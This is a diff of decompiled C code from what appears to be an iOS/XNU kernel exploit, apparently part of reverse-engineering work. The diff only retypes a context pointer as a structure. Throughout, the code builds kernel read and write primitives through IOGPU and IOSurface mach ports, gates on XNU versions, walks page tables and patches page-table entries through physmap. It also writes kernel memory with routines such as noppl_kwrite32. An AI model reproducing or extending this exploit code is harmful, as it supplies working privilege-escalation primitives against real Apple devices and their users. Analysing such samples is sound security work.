@@ -143,10 +143,10 @@ __int64 __fastcall iogpu_teardown_ctx(__int64 a1);
 __int64 __fastcall create_iogpu_shmem_entry(__int64 a1, uint32_t *a2, uint32_t *a3, mach_port_t *a4, uint64_t *a5);
 __int64 __fastcall iogpu_physmap_init(struct_krwCtx *a1);
 __int64 __fastcall iogpu_init_private_ctx(__int64 a1, uint64_t *a2, mem_entry_name_port_t a3, mem_entry_name_port_t a4, mem_entry_name_port_t a5, uint64_t *a6);
-__int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2);
+__int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *a1, uint32_t *a2);
 __int64 __fastcall get_iogpu_physmap_base(__int64);
 void memory_barrier_dsb_isb();
-__int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int a3);
+__int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3);
 unsigned __int64 __fastcall scan_for_macho_header(__int64 *krwCtx, __int64 a2);
 __int64 __fastcall acquire_physmap_page_atomic(__int64 a1);
 __int64 __fastcall query_vm_region_prot_info(vm_address_t a1);
@@ -832,7 +832,7 @@ static bool krw_prepare_selected_setup_path(struct_krwCtx *krwCtx, krw_setup_pat
     case KRW_SETUP_PATH_PORTS_VM:
       return krw_setup_ports_vm((__int64)krwCtx, needsSecondStage);
     case KRW_SETUP_PATH_IOGPU:
-      return iogpu_krw_ctx_setup((__int64)krwCtx, needsSecondStage) == 0;
+      return iogpu_krw_ctx_setup(krwCtx, needsSecondStage) == 0;
     case KRW_SETUP_PATH_IOSURFACE:
     default:
       return krw_setup_iosurface_v2((__int64)krwCtx, needsSecondStage);
@@ -5595,7 +5595,7 @@ LABEL_35:
 }
 
 //----- (000000000000B460) ----------------------------------------------------
-__int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2)
+__int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *a1, uint32_t *a2)
 {
   vm_size_t v2; // x20
   __int64 result; // x0
@@ -5622,14 +5622,14 @@ __int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2)
   address = 0;
   v2 = vm_page_size;
   v20 = -1;
-  if ( *(uint64_t *)(a1 + 344) < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
+  if ( a1->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
     return 708609;
   result = fd_open_dev_null(&v20);
   if ( !(uint32_t)result )
   {
     v6 = 163878;
     v19 = xmmword_43740;
-    v7 = (mach_port_name_t *)iosurface_enum_mach_port(a1, 0x15u);
+    v7 = (mach_port_name_t *)iosurface_enum_mach_port((__int64)a1, 0x15u);
     if ( v7 )
     {
       v8 = 0;
@@ -5644,37 +5644,37 @@ __int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2)
           if ( !vm_map(mach_task_self_, &address, v2, 0, 1, object[0], 0, 0, 3, 3, 2u) )
           {
             v13 = *(uint64_t *)address;
-            if ( validate_kaddr_range(a1, *(uint64_t *)address) )
+            if ( validate_kaddr_range((__int64)a1, *(uint64_t *)address) )
             {
-              *(uint64_t *)(a1 + 6608) = v13;
+              a1->gap19211 = v13;
               v14 = *(uint64_t *)(address + 32);
-              if ( validate_kaddr_range(a1, v14) )
+              if ( validate_kaddr_range((__int64)a1, v14) )
               {
-                *(uint64_t *)(a1 + 6296) = v14;
+                a1->gap191[677] = v14;
                 v15 = (uint64_t *)address;
                 v16 = *(uint64_t *)(address + 40);
                 if ( (unsigned __int64)(v16 - 1) <= 0x1F )
                 {
-                  *(uint32_t *)(a1 + 6304) = v16;
+                  LODWORD(a1->gap191[678]) = v16;
                   v18 = 0;
-                  v6 = iogpu_init_private_ctx(a1, &v18, object[1], object[2], object[3], v15);
+                  v6 = iogpu_init_private_ctx((__int64)a1, &v18, object[1], object[2], object[3], v15);
                   if ( !v6 )
                   {
                     v17 = v18;
-                    *(uint64_t *)(a1 + 48) = iogpu_kread;
-                    *(uint64_t *)(a1 + 64) = iogpu_kwrite;
-                    *(uint64_t *)(a1 + 56) = iogpu_kread2;
-                    *(uint64_t *)(a1 + 72) = iogpu_kwrite2;
-                    *(uint64_t *)(a1 + 80) = v17;
+                    *(uint64_t *)&a1->gap4[44] = (uint64_t)iogpu_kread;
+                    *(uint64_t *)&a1->gap4[60] = (uint64_t)iogpu_kwrite;
+                    *(uint64_t *)&a1->gap4[52] = (uint64_t)iogpu_kread2;
+                    *(uint64_t *)&a1->gap4[68] = (uint64_t)iogpu_kwrite2;
+                    *(uint64_t *)&a1->gap4[76] = v17;
                     fd_close(v20);
                     v20 = -1;
-                    v6 = krw_read_validation(a1, 0);
+                    v6 = krw_read_validation((__int64)a1, 0);
                     if ( !v6 )
                     {
-                      *(uint64_t *)(a1 + 48) = 0;
-                      v6 = krw_write_validation((struct_krwCtx *)a1);
+                      *(uint64_t *)&a1->gap4[44] = 0;
+                      v6 = krw_write_validation(a1);
                       if ( !v6 )
-                        *(uint64_t *)(a1 + 64) = 0;
+                        *(uint64_t *)&a1->gap4[60] = 0;
                     }
                   }
                 }
@@ -5683,7 +5683,7 @@ __int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2)
           }
           break;
         }
-        v7 = (mach_port_name_t *)iosurface_enum_mach_port(a1, *(uint32_t *)((char *)&v19 + v8 * 4 + 4));
+        v7 = (mach_port_name_t *)iosurface_enum_mach_port((__int64)a1, *(uint32_t *)((char *)&v19 + v8 * 4 + 4));
         ++v8;
       }
       while ( v7 );
@@ -5732,7 +5732,7 @@ void memory_barrier_dsb_isb()
 }
 
 //----- (000000000000B768) ----------------------------------------------------
-__int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int a3)
+__int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
 {
   __int64 v6; // x24
   __int64 v7; // x22
@@ -5769,12 +5769,12 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
   v35 = 0;
   v36 = 0;
   v6 = 708619;
-  if ( !(unsigned int)acquire_write_semaphore_lock(krwCtx, 7u, 0x2710u) )
+  if ( !(unsigned int)acquire_write_semaphore_lock((__int64)krwCtx, 7u, 0x2710u) )
   {
-    v8 = *(uint64_t *)(krwCtx + 280);
+    v8 = *(uint64_t *)&krwCtx->gap42[104];
     if ( v8 )
     {
-      if ( *(uint64_t *)(krwCtx + 288) )
+      if ( *(uint64_t *)&krwCtx->gap42[112] )
       {
         v9 = *(uint64_t *)(v8 + 344);
         if ( v9 )
@@ -5788,11 +5788,11 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
     if ( !v12 )
     {
       v7 = 163878;
-      kernelScanCtx[4] = krwCtx;
-      scan_for_macho_header(kernelScanCtx, *(uint64_t *)(krwCtx + 6600));
-      port_kaddr = get_task_kobject_addr((struct_krwCtx *)krwCtx, mach_task_self_);
+      kernelScanCtx[4] = (uint64_t)krwCtx;
+      scan_for_macho_header(kernelScanCtx, krwCtx->gap19210);
+      port_kaddr = get_task_kobject_addr(krwCtx, mach_task_self_);
       kernelScanCtx[2] = port_kaddr;
-      if ( port_kaddr && (kernelScanCtx[3] = kreadptr((struct_krwCtx *)krwCtx, port_kaddr)) != 0 )
+      if ( port_kaddr && (kernelScanCtx[3] = kreadptr(krwCtx, port_kaddr)) != 0 )
       {
         if ( !(unsigned int)init_text_exec_data_const_sections(v30) && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, v30) )
         {
@@ -5805,63 +5805,63 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
           else
           {
             get_ppnum_via_kread((__int64)v34);
-            v25 = 2 * *(uint32_t *)(krwCtx + 384);
-            v15 = alloc_physmap_page(krwCtx, (unsigned int *)&v25);
+            v25 = 2 * krwCtx->pageSizeOrSomething;
+            v15 = alloc_physmap_page((__int64)krwCtx, (unsigned int *)&v25);
             if ( !v15 )
             {
               v7 = 708617;
               goto LABEL_27;
             }
             v9 = v15;
-            v16 = pgtable_walk_wrapper(krwCtx, v15, v27);
+            v16 = pgtable_walk_wrapper((__int64)krwCtx, v15, v27);
             if ( !v16 )
               goto LABEL_27;
-            v17 = pgtable_walk_wrapper(krwCtx, v9 + *(unsigned int *)(krwCtx + 384), v26);
+            v17 = pgtable_walk_wrapper((__int64)krwCtx, v9 + krwCtx->pageSizeOrSomething, v26);
             if ( !v17 )
               goto LABEL_27;
-            v18 = map_physpage_for_kobj((struct_krwCtx *)krwCtx, v26[0]);
+            v18 = map_physpage_for_kobj(krwCtx, v26[0]);
             if ( !v18 )
               goto LABEL_27;
             v19 = v18;
-            v20 = *(uint64_t *)(krwCtx + 392);
+            v20 = krwCtx->pageMask;
             v21 = v27[4];
             v22 = v27[0];
-            v23 = pgtable_walk_wrapper(krwCtx, v27[0] & ~v20, v34);
+            v23 = pgtable_walk_wrapper((__int64)krwCtx, v27[0] & ~v20, v34);
             if ( v23 && (v36 & 0xFFFFFFFFC000LL) != 0 )
             {
               v30[0] = (uint64_t *)MEMORY[0x400000008];
               kernelScanCtx[0] = (MEMORY[0x400000008] & 0xFFFF000000003FFFLL) | (v36 & 0xFFFFFFFFC000LL);
               MEMORY[0x400000008] = kernelScanCtx[0];
               memory_barrier_dsb_isb();
-              semaphore_timedwait_ns(krwCtx, 0x2710u);
+              semaphore_timedwait_ns((__int64)krwCtx, 0x2710u);
               *(uint64_t *)((v22 & 0x3FFF) | 0x400004000LL) = (v21 & 0xFFFF000000003FFFLL)
                                                         | ((((v19 & (unsigned __int64)~v20) >> 14) & 0x3FFFFFFFFLL) << 14);
               memory_barrier_dsb_isb();
               MEMORY[0x400000008] = v30[0];
-              semaphore_timedwait_ns(krwCtx, 0x2710u);
-              v24 = *(uint64_t *)(krwCtx + 280);
-              if ( v24 && *(uint64_t *)(krwCtx + 288) )
+              semaphore_timedwait_ns((__int64)krwCtx, 0x2710u);
+              v24 = *(uint64_t *)&krwCtx->gap42[104];
+              if ( v24 && *(uint64_t *)&krwCtx->gap42[112] )
                 *(uint64_t *)(v24 + 344) = v9;
 LABEL_6:
               v7 = 163878;
-              v10 = pgtable_walk_wrapper(krwCtx, a2, v34);
+              v10 = pgtable_walk_wrapper((__int64)krwCtx, a2, v34);
               if ( v10 )
               {
                 if ( v35 == 3 )
                 {
-                  v11 = v9 + 8 * (((*(uint32_t *)(krwCtx + 384) + (uint32_t)v9) & 0x1FFFFFFu) / *(uint32_t *)(krwCtx + 384));
-                  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)krwCtx, v11, 8, kernelScanCtx) )
+                  v11 = v9 + 8 * (((krwCtx->pageSizeOrSomething + (uint32_t)v9) & 0x1FFFFFFu) / krwCtx->pageSizeOrSomething);
+                  if ( (unsigned int)krw_read_thunk(krwCtx, v11, 8, kernelScanCtx) )
                   {
                     v27[0] = (kernelScanCtx[0] & 0xFFFF000000003FFFLL) | (((v36 >> 14) & 0x3FFFFFFFFLL) << 14);
                     if ( v27[0] == kernelScanCtx[0] )
                       goto LABEL_12;
-                    if ( (unsigned int)kwrite_with_retry(krwCtx, v11, (__int64)v27, 8) )
+                    if ( (unsigned int)kwrite_with_retry((__int64)krwCtx, v11, (__int64)v27, 8) )
                     {
-                      semaphore_timedwait_ns(krwCtx, 0x2710u);
+                      semaphore_timedwait_ns((__int64)krwCtx, 0x2710u);
 LABEL_12:
                       if ( noppl_kwrite32(
-                             krwCtx,
-                             v9 + *(unsigned int *)(krwCtx + 384) + (*(uint64_t *)(krwCtx + 392) & a2),
+                             (__int64)krwCtx,
+                             v9 + krwCtx->pageSizeOrSomething + (krwCtx->pageMask & a2),
                              a3) )
                       {
                         v7 = 0;
@@ -5885,7 +5885,7 @@ LABEL_12:
                 }
               }
 LABEL_27:
-              release_write_semaphore_lock(krwCtx, 7u);
+              release_write_semaphore_lock((__int64)krwCtx, 7u);
               return v7;
             }
           }
@@ -5932,7 +5932,7 @@ unsigned __int64 __fastcall scan_for_macho_header(__int64 *krwCtx, __int64 a2)
     }
   }
   v4 = *krwCtx;
-  result = find_kernel_base_ptr((struct_krwCtx *)krwCtx[4]);
+  result = find_kernel_base_ptr(KRWCTX_FROM_UINTPTR(krwCtx[4]));
   krwCtx[1] = v4 - result;
   return result;
 }
@@ -11996,7 +11996,7 @@ bool __fastcall check_physmap_range_necp(struct_krwCtx *a1, unsigned __int64 a2,
   {
     if ( xnuVersionPacked > XNU_VERSION_PACKED(10002, 42, 7, 1023, 1023) )
       return 0;
-    v8 = iogpu_kernel_read_op((__int64)a1, a2, a3);
+    v8 = iogpu_kernel_read_op(a1, a2, a3);
     return v8 == 0;
   }
   v8 = dmaFail_physwrite32(a1, a2, a3);
